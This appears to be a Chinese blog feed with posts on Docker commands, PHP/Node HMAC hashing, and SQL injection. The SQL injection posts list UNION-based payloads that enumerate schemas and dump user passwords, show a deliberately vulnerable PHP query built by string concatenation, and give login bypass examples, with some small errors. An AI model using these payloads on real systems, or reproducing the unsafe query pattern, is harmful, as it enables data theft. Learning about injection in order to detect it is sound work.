class="line">* IMAGE ID：镜像ID</span><br><span class="line"></span><br><span class="line">* CREATED：镜像创建时间</span><br><span class="line"></span><br><span class="line">* SIZE：镜像大小</span><br></pre></td></tr></table></figure></li><li>查找镜像<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ docker search nginx </span><br><span class="line">NAME     DESCRIPTION                    STARS      OFFICIAL </span><br><span class="line">nginx    Official build of Nginx.       11154        [OK]</span><br><span class="line"></span><br><span class="line">NAME:镜像仓库源的名称</span><br><span class="line"></span><br><span class="line">DESCRIPTION:镜像的描述</span><br><span class="line"></span><br><span class="line">OFFICIAL:是否docker官方发布</span><br></pre></td></tr></table></figure></li><li>获取一个新镜像</li></ul><p>如果我们决定使用上图中的 nginx 官方镜像，使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker pull nginx</span><br></pre></td></tr></table></figure><h3 id="容器操作"><a href="#容器操作" class="headerlink" title="容器操作"></a>容器操作</h3><ul><li>列出下载到计算机中的 container <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker container ls</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</span><br></pre></td></tr></table></figure></li></ul><h3 id="仓库操作"><a href="#仓库操作" class="headerlink" title="仓库操作"></a>仓库操作</h3><ul><li>登入<code>hub.docker.com</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker login </span><br><span class="line"># 前提是先注册号账号</span><br></pre></td></tr></table></figure></li><li>标记镜像，以便上传至目标位置<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker tag mydocker aikang&#x2F;get-started:part1</span><br><span class="line"># 最后上传至所登入的Docker Hub仓库</span><br></pre></td></tr></table></figure></li><li>将标记的镜像上传到存储库：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker push mydocker aikang&#x2F;get-started:part1</span><br></pre></td></tr></table></figure></li><li>从远程存储库中拉出并运行映像<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -d -p 4000:80 aikang&#x2F;get-started:part1</span><br></pre></td></tr></table></figure>注意：无论在哪里执行<code>docker run</code>，它都会提取你的镜像，以及Python和所有依赖项requirements.txt，并运行你的代码。它们都在一个整洁的小包中一起旅行，你不需要在主机上安装任何东西让Docker运行它。</li></ul><h3 id="服务操作"><a href="#服务操作" class="headerlink" title="服务操作"></a>服务操作</h3><ul><li>群集初始化，可以使节点变成群集管理器<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker swarm init</span><br></pre></td></tr></table></figure></li><li>以服务运行<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker stack deploy -c docker-compose.yml getstartedlab</span><br><span class="line">Creating network getstartedlab_webnet</span><br><span class="line">Creating service getstartedlab_web</span><br><span class="line"># 需要有一个docker-compose.yml 文件</span><br></pre></td></tr></table></figure></li><li>列出与应用程序关联的正在运行的服务<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker service ls</span><br></pre></td></tr></table></figure></li><li>查看与堆栈相关的所有服务<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker stack services getstartedlab</span><br><span class="line"># getstartedlab 表示服务的Names</span><br></pre></td></tr></table></figure></li><li>列出服务任务<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker service ps getstartedlab</span><br><span class="line"># getstartedlab 表示服务的Names</span><br></pre></td></tr></table></figure></li><li>关闭服务<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker stack rm getstartedlab</span><br><span class="line"># getstartedlab 表示服务的Names</span><br></pre></td></tr></table></figure></li><li>查看集群中的节点<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker node ls</span><br></pre></td></tr></table></figure><h3 id="VM-交互"><a href="#VM-交互" class="headerlink" title="VM 交互"></a>VM 交互</h3></li><li>创建一个VM 实例（Win、Mac、Linux）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine create --driver virtualbox myvm1</span><br></pre></td></tr></table></figure></li><li>使用ssh 连接VM 实例<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine ssh myvm1</span><br></pre></td></tr></table></figure></li><li>查看关于节点的基本信息<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine env myvm1</span><br></pre></td></tr></table></figure></li><li>使用scp命令将本地文件copy到VM实例中<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine scp &lt;filename&gt; myvm1:~  </span><br><span class="line"># 从当前目录拷贝到实例中的根目录下</span><br></pre></td></tr></table></figure></li><li>删除指定VM<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine rm myvm1</span><br></pre></td></tr></table></figure></li><li>将Shell 与VM 连接<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ eval $(docker-machine env myvm1)</span><br></pre></td></tr></table></figure></li><li>将Shell 与VM 断开，使用本地连接<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ eval $(docker-machine env -u)</span><br></pre></td></tr></table></figure><h3 id="集群操作"><a href="#集群操作" class="headerlink" title="集群操作"></a>集群操作</h3>以下操作均需要在VM CLI 中运行</li><li>初始化集群<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker swarm init --advertise-addr &lt;myvm1 ip&gt;</span><br></pre></td></tr></table></figure></li><li>将节点加入集群<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker swarm join --token &lt;token&gt; &lt;ip&gt;:2377&quot;</span><br></pre></td></tr></table></figure></li><li>让工作者离开集群<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker swarm leave</span><br></pre></td></tr></table></figure></li><li>强制离开并关掉集群<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker swarm leave -f</span><br></pre></td></tr></table></figure></li><li>查看该节点的详情信息<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker node inspect &lt;node ID&gt;</span><br></pre></td></tr></table></figure></li><li>部署应用程序<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker stack deploy -c &lt;file&gt; &lt;app&gt;</span><br></pre></td></tr></table></figure></li></ul><h3 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h3><ul><li>查看Docker版本：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker version</span><br></pre></td></tr></table></figure></li><li>显示Docker系统信息，包括镜像和容器数：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker info</span><br></pre></td></tr></table></figure></li><li>查看Docker 容器的配置和状态信息。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker inspect mydocker</span><br><span class="line"># 表示容器的Container ID 或者Names</span><br></pre></td></tr></table></figure></li><li>查看指定容器映射到宿主机的端口号。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker port mydocker</span><br><span class="line">80&#x2F;tcp -&gt; 0.0.0.0:4000</span><br><span class="line"># mydocker 表示该应用的Container ID 或者Names</span><br></pre></td></tr></table></figure></li><li>查看Web 应用程序日志<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ docker logs -f mydocker </span><br><span class="line"> * Running on http:&#x2F;&#x2F;0.0.0.0:80&#x2F; (Press CTRL+C to quit)</span><br><span class="line">113.87.130.57 - - [01&#x2F;Apr&#x2F;2019 12:58:34] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -</span><br><span class="line">113.87.130.57 - - [01&#x2F;Apr&#x2F;2019 12:58:35] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -</span><br><span class="line"># mydocker 表示该应用的Container ID 或者是Names</span><br></pre></td></tr></table></figure></li><li>查看Web 应用程序容器的进程<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker top mydocker </span><br><span class="line"># </span><br><span class="line">UID        PID       PPID        C     STIME        TTY         TIME                CMD</span><br><span class="line">root      22358      22323       0     20:58        ?      00:00:00            python app.py</span><br></pre></td></tr></table></figure></li></ul><h2 id="杂项-1"><a href="#杂项-1" class="headerlink" title="杂项"></a>杂项</h2><h3 id="容器有哪些网络模式"><a href="#容器有哪些网络模式" class="headerlink" title="容器有哪些网络模式"></a>容器有哪些网络模式</h3><h5 id="1-None"><a href="#1-None" class="headerlink" title="1. None"></a>1. None</h5><p>在该模式下容器没有对外网络，本地机只有一个回路地址</p><h5 id="2-Container"><a href="#2-Container" class="headerlink" title="2. Container"></a>2. Container</h5><p>在该模式下，与另一个容器共享网络</p><h5 id="3-Host"><a href="#3-Host" class="headerlink" title="3. Host"></a>3. Host</h5><p>在该模式下，与主机共享网络</p><h5 id="4-Bridge"><a href="#4-Bridge" class="headerlink" title="4. Bridge"></a>4. Bridge</h5><p>该模式为Docker 默认的网络模式，在这种模式下，Docker 容器与外部的通信都是通过 iptable 实现的。</p><h5 id="5-Overlay"><a href="#5-Overlay" class="headerlink" title="5. Overlay"></a>5. Overlay</h5><p>该模式为Docker 目前原生的跨主机多子网模型，主要是通过 vxlan 技术实现。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="http://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html" target="_blank" rel="noopener">Docker 入门教程 - 阮一峰网络日志</a></li><li><a href="wiki.jikexueyuan.com/project/docker-technology-and-combat">Docker 入门 - 极客学院</a></li><li><a href="https://docs.docker.com/install/" target="_blank" rel="noopener">安装Docker ce - 官方文档</a></li><li><a href="http://www.ityouknow.com/docker/2018/04/19/docker-swarm.html" target="_blank" rel="noopener">Docker Swarm 入门教程</a></li><li><a href="http://www.runoob.com/docker/ubuntu-docker-install.html" target="_blank" rel="noopener">如何在Ubuntu 18.4上安装 Docker-ce</a></li><li><a href="https://docs.docker.com/machine/install-machine/" target="_blank" rel="noopener">如何在Ubuntu 18.04上安装Docker Machine</a></li><li><a href="https://linuxize.com/post/how-to-install-virtualbox-on-ubuntu-18-04/#disqus_thread" target="_blank" rel="noopener">如何在Ubuntu 18.04上安装VirtualBox</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP 中使用 hash_hmac 加密</title>
      <link href="/php-uses-hash-hmac-encryption/"/>
      <url>/php-uses-hash-hmac-encryption/</url>
      
        <content type="html"><![CDATA[<p>今天做项目时，遇到一个问题，需要将一段哈希值按照某种规则进行加密。源码是用<code>Node</code>写的，需要翻译成<code>PHP</code> 版本的。</p><a id="more"></a><h3 id="PHP中使用-Hmac-方法生成带有密钥的哈希值"><a href="#PHP中使用-Hmac-方法生成带有密钥的哈希值" class="headerlink" title="PHP中使用 Hmac 方法生成带有密钥的哈希值"></a>PHP中使用 Hmac 方法生成带有密钥的哈希值</h3><p>在Node.js 中，这是一段用于生成“加盐”的哈希值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var crypto &#x3D; require(&#39;crypto&#39;);</span><br><span class="line"></span><br><span class="line">var secret &#x3D; &quot;122410&quot;</span><br><span class="line">var key &#x3D; &quot;key&quot;</span><br><span class="line">var hash &#x3D; crypto.createHmac(&#39;sha256&#39;, secret).update(key).digest(&#39;hex&#39;)</span><br><span class="line"></span><br><span class="line">console.log(hash);</span><br><span class="line">&#x2F;&#x2F; dcc9ddf4836d4ecb6bd12fccc983207f39cfb84c43c01932eee22357cf0567b4</span><br></pre></td></tr></table></figure><p>如果要翻译成PHP版本，其实非常简单，直接使用PHP 的 <code>hash_hmac</code>函数就可以了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$secret &#x3D; &quot;122410&quot;; </span><br><span class="line">$key &#x3D; &quot;key&quot;;</span><br><span class="line">echo hash_hmac(&quot;sha256&quot;, $key, $secret);</span><br><span class="line">&#x2F;&#x2F; dcc9ddf4836d4ecb6bd12fccc983207f39cfb84c43c01932eee22357cf0567b4</span><br></pre></td></tr></table></figure><h4 id="将密钥设置成二进制"><a href="#将密钥设置成二进制" class="headerlink" title="将密钥设置成二进制"></a>将密钥设置成二进制</h4><p>如果需要加密的部分，并不是普通的字符串，而是二进制字符串，那么需要使用<code>pack</code>函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var_dump(hash_hmac(&quot;sha1&quot;, &quot;office:fred&quot;, &quot;AA381AC5E4298C23B3B3333333333333333333&quot;));</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 5e50e6458b0cdc7ee534967d113a9deffe6740d0</span><br><span class="line">&#x2F;&#x2F; 预期结果：46abe81345b1da2f1a330bba3d6254e110cd9ad8</span><br></pre></td></tr></table></figure><p>先将十六进制字符串转换为二进制数据，然后再将其传递给<code>hash_hmac</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(hash_hmac(&quot;sha1&quot;, &quot;office:fred&quot;, pack(&quot;H*&quot;, &quot;AA381AC5E4298C23B3B3333333333333333333&quot;)));</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 46abe81345b1da2f1a330bba3d6254e110cd9ad8</span><br></pre></td></tr></table></figure><h3 id="Node中使用crypto进行md5-加密"><a href="#Node中使用crypto进行md5-加密" class="headerlink" title="Node中使用crypto进行md5 加密"></a>Node中使用crypto进行md5 加密</h3><p>在PHP 中，如果需要获取某个字符串的md5 加密之后的哈希值，非常简单，直接使用<code>md5</code> 函数即可。</p><p>但是在<code>node.js</code> 中，并没有为我们直接提供这样的函数，所以需要手动调用<code>crypto</code> 模块去转换：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var pwd &#x3D; &quot;122410&quot;;</span><br><span class="line">var hash &#x3D; crypto.createHash(&#39;md5&#39;).update(pwd).digest(&#39;hex&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 913975c2f972ba6bbf5ba593c68a5dc5</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://stackoverflow.com/questions/13012239/how-to-set-the-hmacsha1-key-to-hex-in-php" target="_blank" rel="noopener">如何在PHP中将hmac sha1密钥设置为十六进制？</a></li><li><a href="https://caligatio.github.io/jsSHA/" target="_blank" rel="noopener">在线转换工具</a></li><li><a href="https://www.php.net/manual/zh/function.hash-hmac.php" target="_blank" rel="noopener">php hash_hmac 函数</a></li><li><a href="http://nodejs.cn/api/crypto.html" target="_blank" rel="noopener">node.js crypto 模块</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Hash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>整理常见的 SQL 注入语句</title>
      <link href="/organize-common-sql-injection-statements/"/>
      <url>/organize-common-sql-injection-statements/</url>
      
        <content type="html"><![CDATA[<p>这篇笔记的目的是整理各种 SQL 注入使用时的<code>payload</code>。</p><a id="more"></a><blockquote><p>说明：以下的<code>payloads</code>都基于单引号字符型注入。若是整型注入则把单引号和注释符（–+）去掉，若是双引号注入则把单引号换成双引号。</p></blockquote><p>也就是基于这样一种情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE id &#x3D; &#39;1&#39;;</span><br></pre></td></tr></table></figure><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><ol><li>判断当前数据表中有几列：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; order by 数值 --+</span><br></pre></td></tr></table></figure><ol start="2"><li>查看显示位在第几列：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure><blockquote><p>注意：这里需要传递一个不存在的条件，比如：<code>id=-1</code></p></blockquote><ol start="3"><li>显示当前数据库（假设显示位中包含第三位）：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,database() --+</span><br></pre></td></tr></table></figure><ol start="4"><li>查看当前数据库中的所有表：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) --+</span><br></pre></td></tr></table></figure><blockquote><p>函数<code>group_concat()</code>把所有结果都在一行输出</p></blockquote><ol start="5"><li>查询所有数据库：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schema) --+</span><br></pre></td></tr></table></figure><ol start="6"><li>查询某个数据库中的表：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; --+</span><br></pre></td></tr></table></figure><ol start="7"><li><p>查询某个表中的所有字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; --+</span><br></pre></td></tr></table></figure></li><li><p>查询某个表中的字段内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(name, 0x3a, passwd) from security.users)</span><br></pre></td></tr></table></figure><blockquote><p>0x3a会被转义位冒号<code>：</code></p></blockquote></li></ol><h3 id="Union"><a href="#Union" class="headerlink" title="Union"></a>Union</h3><p>SQL UNION 操作符合并两个或多个 SELECT 语句的结果，需要注意的是：UNION 内部的每个 SELECT 语句必须拥有相同数量的列。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://ca0y1h.top/Web_security/basic_learning/5.%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">Web安全学习之数据库注入语句的收集和学习</a></p>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
            <tag> Web 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>认识SQL 注入常见方式</title>
      <link href="/know-common-ways-of-sql-injection/"/>
      <url>/know-common-ways-of-sql-injection/</url>
      
        <content type="html"><![CDATA[<p>最近需要做一个检测<code>SQL 注入</code>的功能，无奈发现自己于对<code>SQL 注入</code>竟有点陌生，本着搞清楚原理才能更好的理解Bug 产生的原因，于是便有了这篇笔记。</p><a id="more"></a><h2 id="SQL-注入是什么？"><a href="#SQL-注入是什么？" class="headerlink" title="SQL 注入是什么？"></a>SQL 注入是什么？</h2><p>SQL 注入是一种将SQL 语句添加到REQUEST 参数中，传递到服务器并执行的一种攻击手段。</p><p>SQL 注入攻击是REQUEST 引數未经过过滤，然后直接拼接到SQL 语句中，解析并执行，而达到预想之外的一种行为。</p><h2 id="SQL-注入是怎样产生的"><a href="#SQL-注入是怎样产生的" class="headerlink" title="SQL 注入是怎样产生的"></a>SQL 注入是怎样产生的</h2><ol><li>WEB 开发人员无法保证所有的输入都已经完美过滤。</li><li>数据库未做安全配置，存在安全隐患。</li></ol><h2 id="如何进行SQL-注入"><a href="#如何进行SQL-注入" class="headerlink" title="如何进行SQL 注入"></a>如何进行SQL 注入</h2><p>这里以<code>PHP</code>、<code>Mysql</code>为例，介绍一下完整的SQL 注入攻击是如何产生的。</p><h3 id="回显注入"><a href="#回显注入" class="headerlink" title="回显注入"></a>回显注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$db_host &#x3D; &quot;localhost&quot;;</span><br><span class="line">$db_user &#x3D; &quot;root&quot;;</span><br><span class="line">$db_pwd &#x3D; xxxxxx;</span><br><span class="line">$db_name &#x3D; &quot;User&quot;;</span><br><span class="line">$db_table &#x3D; &quot;Student&quot;;</span><br><span class="line"></span><br><span class="line">echo &#39;&lt;h1&gt;&#39;;</span><br><span class="line">echo &#39;Test ErrorBased Injections&#39;;</span><br><span class="line">echo &#39;&lt;&#x2F;h1&gt;&#39;;</span><br><span class="line">error_reporting(E_ALL ^ E_DEPRECATED);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 测试连接</span><br><span class="line">$conn &#x3D; mysqli_connect($db_host, $db_user, $db_pwd);</span><br><span class="line">if (!$conn)&#123;</span><br><span class="line">    echo &#39;Mysql 连接失败:&#39;.mysqli_error($conn);</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    echo &#39;Mysql 连接成功&#39;;</span><br><span class="line">&#125;</span><br><span class="line">echo &#39;&lt;hr&gt;&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;连接数据库</span><br><span class="line">mysqli_select_db($conn, $db_name) or die (&quot;无法连接到数据库: &quot;.$db_name);</span><br><span class="line">mysqli_query($conn, &#39;set names utf-8&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 获取参数</span><br><span class="line">if(isset($_GET[&#39;id&#39;]))&#123;</span><br><span class="line">    $id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 拼接SQL语句</span><br><span class="line">$sql&#x3D; &quot;SELECT * FROM $db_table WHERE id &#x3D; &#123;$id&#125; &quot;;</span><br><span class="line">echo &#39;查询SQL 语句:&#39;.$sql;</span><br><span class="line">echo &#39;&lt;hr&gt;&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;执行</span><br><span class="line">$result&#x3D;mysqli_query($conn, $sql);</span><br><span class="line">$row&#x3D;mysqli_fetch_array($result, MYSQLI_BOTH);</span><br><span class="line">if($row) &#123;</span><br><span class="line">  echo &#39;Your Login name:&#39;.$row[&#39;username&#39;];</span><br><span class="line">  echo &#39;&lt;hr&gt;&#39;;</span><br><span class="line">  echo &#39;Your Password:&#39;.$row[&#39;password&#39;];</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>调用地址是<code>http://127.0.0.1/sqli.php?id=1</code>，使用<code>GET</code>传入参数<code>id</code>，输出的SQL 语句如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE id &#x3D; &#39;1&#39;</span><br></pre></td></tr></table></figure><p>正常情况下，会返回<code>id = 1</code> 的学生信息。</p><h4 id="1-数字注入"><a href="#1-数字注入" class="headerlink" title="1. 数字注入"></a>1. 数字注入</h4><p>如果在浏览器中输入：<code>http://127.0.0./sqli.php?id=1&#39; union select 1,2--+</code>会怎样呢？输出的SQL 语句如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE id &#x3D; -1 or 1&#x3D;1</span><br></pre></td></tr></table></figure><p>这会导致所有的学生信息都被输出了，为什么会这样呢？这是因为<code>id = -1</code>是一个不存在的条件，而<code>1 = 1</code>却是一个永远存在的条件，这就相当于没有加 Where 条件。</p><h4 id="2-字符串注入"><a href="#2-字符串注入" class="headerlink" title="2. 字符串注入"></a>2. 字符串注入</h4><p>现在有这样一种场景：<code>http://127.0.0./login.php</code>模拟用户登录。假设正确的用户名和密码是<code>Boo</code>、<code>122410</code>，那么在正常的登录情况下所执行的SQL 语句如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39; ADN password &#x3D; &#39;122410&#39;</span><br></pre></td></tr></table></figure><p>由于用户名和密码都是字符串，所以SQL 注入会把参数携带的数据变成<code>Mysql</code>中的注释。Mysql 中的注释有两种。</p><h4 id="1"><a href="#1" class="headerlink" title="1. #"></a>1. <code>#</code></h4><p>假设<code>POST</code> 传递的参数分别是：<code>username = Boo&#39;#</code>、<code>password = xxxxxx</code>，那么产生的SQL 语句则是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39;#&#39;ADN password &#x3D; &#39;xxxxxx&#39;</span><br></pre></td></tr></table></figure><p>因为<code>#</code>号 后的所有字符串都会被当成注释来处理，所以上面的SQL 语句等价于：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39;</span><br></pre></td></tr></table></figure><h4 id="2"><a href="#2" class="headerlink" title="2. --"></a>2. <code>--</code></h4><p>假设<code>POST</code>请求传递的参数分别是：<code>username = Boo&#39;--</code>、<code>password = xxxxxx</code>，那么产生的SQL 语句则是：</p><figure class="highlight plain"><table><tr><td 